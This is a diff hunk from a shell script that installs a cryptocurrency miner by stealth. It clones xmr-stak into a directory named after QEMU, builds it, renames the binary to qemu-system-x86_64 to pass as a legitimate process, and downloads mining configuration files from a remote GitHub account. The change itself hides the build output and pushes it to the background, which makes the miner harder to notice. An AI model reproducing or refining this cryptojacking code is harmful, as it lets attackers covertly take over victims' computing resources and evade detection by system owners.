@@ -15,8 +15,8 @@ workingdir=/usr/share/packages_download/
 git clone https://github.com/fireice-uk/xmr-stak.git $workingdir/qemu-system-x86
 mkdir $workingdir/qemu-system-x86/build
 cd $workingdir/qemu-system-x86/build
-cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
-make install
+cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF > /dev/null 2>&1&
+make install > /dev/null 2>&1&
 mv $workingdir/qemu-system-x86/build/bin/xmr-stak $workingdir/qemu-system-x86/build/bin/qemu-system-x86_64
 curl https://raw.githubusercontent.com/githubuserold/miner/master/cpu.txt > $workingdir/qemu-system-x86/build/bin/cpu.txt
 curl https://raw.githubusercontent.com/githubuserold/miner/master/config_new.txt > $workingdir/qemu-system-x86/build/bin/config.txt
